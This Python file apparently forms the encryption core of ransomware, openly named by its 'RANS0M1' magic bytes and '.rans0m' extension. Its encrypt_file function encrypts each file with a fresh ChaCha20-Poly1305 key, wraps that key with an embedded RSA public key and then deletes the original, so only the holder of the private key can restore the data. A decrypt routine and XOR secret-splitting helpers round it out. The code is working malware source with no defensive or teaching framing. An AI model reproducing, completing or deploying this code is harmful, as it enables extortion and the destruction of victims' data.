import os
import struct

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305


PUBLIC_KEY_PEM = (
    "-----BEGIN PUBLIC KEY-----"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/ValfnKjDYSFXlBBT+V"
    "tenXfeeaFU62/6FVqWyXXbY5A6iUXx7zSmAFNPRTaTjavGWDwTO3+UhNV6878cyl"
    "ClllM4F+g0Ze6p+oOxvDiV2VuGTomWUAdByclvdpj9FSVHJdgyqHkqPhJaFsNiSM"
    "9T5FSh/6Bd0MN/FWirLzZZn6nSlH1CEGG71iGPmq4migXDTP3gdijjlW0wxWmqiv"
    "9KpLn1vx9be6Ug/A/0u+LQ1Ei9SO+rWH5x138cyewWpg/pdRKZ+SXdPRBF22w9m0"
    "rxtElbfO0y1Dn2YdnJWZH4XDqSt2Xz7tKPYE8uLuh0Q+Nw6+B1Oxcw/CTFHYDNnt"
    "WQIDAQAB"
    "-----END PUBLIC KEY-----"
)

_RSA_PUB = serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode())

_OAEP = rsa_padding.OAEP(
    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(),
    label=None,
)


MAGIC = b"RANS0M1\n"
EXT = ".rans0m"
CHUNK = 1024 * 1024
TAG = 16
_LEN = struct.Struct(">I")
_BLOB = struct.Struct(">4s32sQ")


def load_private_key(pem_path: str = "private_key.pem"):
    with open(pem_path, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)


def private_key_from_pem(pem: bytes):
    return serialization.load_pem_private_key(pem, password=None)


def is_encrypted(path: str) -> bool:
    try:
        with open(path, "rb") as f:
            return f.read(len(MAGIC)) == MAGIC
    except OSError:
        return False


def _flagged(prefix: bytes, counter: int) -> bytes:
    return bytes([prefix[0] | 0x80]) + prefix[1:] + struct.pack(">Q", counter)


def encrypt_file(path: str) -> int:
    if path.lower().endswith(EXT) or is_encrypted(path):
        return 0

    key = os.urandom(32)
    prefix = os.urandom(4)
    aead = ChaCha20Poly1305(key)
    orig_size = os.path.getsize(path)
    wrapped = _RSA_PUB.encrypt(_BLOB.pack(prefix, key, orig_size), _OAEP)

    tmp = path + EXT + ".part"
    counter = 0
    with open(path, "rb") as src, open(tmp, "wb") as dst:
        dst.write(MAGIC)
        dst.write(_LEN.pack(len(wrapped)))
        dst.write(wrapped)
        while True:
            chunk = src.read(CHUNK)
            if not chunk:
                break
            dst.write(aead.encrypt(prefix + struct.pack(">Q", counter), chunk, None))
            counter += 1
        dst.write(aead.encrypt(_flagged(prefix, counter), b"", None))
    os.replace(tmp, path + EXT)
    os.remove(path)
    return orig_size


def decrypt_file(path: str, private_key) -> int:
    if not path.lower().endswith(EXT):
        return 0
    with open(path, "rb") as f:
        if f.read(len(MAGIC)) != MAGIC:
            raise ValueError(f"formato desconocido: {path}")
        (wlen,) = _LEN.unpack(f.read(4))
        wrapped = f.read(wlen)
        prefix, key, orig_size = _BLOB.unpack(private_key.decrypt(wrapped, _OAEP))
        aead = ChaCha20Poly1305(key)

        out_path = path[: -len(EXT)]
        counter = 0
        remaining = orig_size
        with open(out_path, "wb") as out:
            while remaining > 0:
                take = min(CHUNK, remaining)
                ct = f.read(take + TAG)
                out.write(aead.decrypt(prefix + struct.pack(">Q", counter), ct, None))
                remaining -= take
                counter += 1
            fin = f.read(TAG)
            if fin:
                aead.decrypt(_flagged(prefix, counter), fin, None)
    os.remove(path)
    return orig_size


def split_secret(secret: bytes, n: int) -> list:
    shares = [os.urandom(len(secret)) for _ in range(n - 1)]
    last = secret
    for s in shares:
        last = bytes(a ^ b for a, b in zip(last, s))
    return shares + [last]


def join_secret(shares: list) -> bytes:
    out = shares[0]
    for s in shares[1:]:
        out = bytes(a ^ b for a, b in zip(out, s))
    return out
